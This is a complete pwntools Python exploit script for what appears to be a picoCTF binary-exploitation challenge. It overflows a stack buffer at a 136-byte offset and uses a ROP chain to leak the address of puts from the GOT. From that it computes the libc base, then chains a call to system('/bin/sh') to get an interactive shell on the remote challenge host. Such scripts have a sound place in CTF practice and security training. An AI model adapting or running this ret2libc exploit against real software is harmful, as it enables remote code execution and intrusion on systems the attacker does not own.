from pwn import *

# context.log_level = "debug"

elf = context.binary = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

def get_padding():
    wee = cyclic(1024)
    io = process(elf.path)
    io.sendline(wee)
    io.wait()
    core = io.corefile
    stack = core.rsp
    pattern = core.read(stack, 4)
    offset = cyclic_find(pattern)
    return offset

# padding = get_padding()
padding = 136

log.info("Padding: " + str(padding))

if args.REMOTE:
    io = remote("mercury.picoctf.net", 62289)
else:
    io = elf.process()

io.recvline()

payload = b""
payload += b"A" * padding

rop = ROP(elf)
rop.call(elf.sym["puts"], [elf.got["puts"]])
rop.call(elf.sym["main"])

payload += rop.chain()

io.sendline(payload)

io.recvline()
# puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
puts_leak = u64(io.recvuntil(b'\x7f').strip().ljust(8, b"\x00"))
log.info("Leaked puts: " + hex(puts_leak))

libc.address = puts_leak - libc.sym["puts"]
log.info("Libc base: " + hex(libc.address))

rop2 = ROP([elf, libc])
# put a gadget that does nothing; just to align the stack
rop2.raw(rop2.find_gadget(["ret"]).address)
rop2.call(libc.sym["system"], [next(libc.search(b"/bin/sh\x00"))])

payload2 = b""
payload2 += b"A" * padding
payload2 += rop2.chain()

# pause()

io.sendline(payload2)

io.interactive()
